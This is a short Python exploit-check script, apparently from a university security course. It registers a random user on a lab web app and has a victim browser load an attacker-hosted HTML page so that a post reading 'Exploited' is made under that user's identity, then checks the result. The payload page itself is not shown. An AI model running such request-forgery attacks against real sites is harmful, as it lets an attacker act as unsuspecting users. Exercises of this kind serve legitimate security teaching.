from requests import session, get
from sys import argv
from random import randint
from Common.Driver import runScript

SERVER = argv[1]
attackerSERVER = "http://web.tecnico.ulisboa.pt/ist190774/SSof/ZUfXoyNXyAZj4GFlS9GX.html"

s = session()
username = str(randint(2 ** 27, 2 ** 28))
password = str(randint(2 ** 27, 2 ** 28))

# Cleaning DB
r = get(SERVER + "/init")
assert "Initialisation DONE!" in r.text

data = {
    "username": username,
    "password": password
}
r = s.post(SERVER + "/register", data=data)

assert "Welcome" in r.text
assert username in r.text

# The Victim Browser Executes the Malicious Script
# And Create a Post with Content "Exploited" & Type "Public" Impersonating the Victim
runScript(SERVER, attackerSERVER, s)

r = s.get(SERVER)

assert username in r.text
assert "Exploited" in r.text

print("Success!")
s.close()
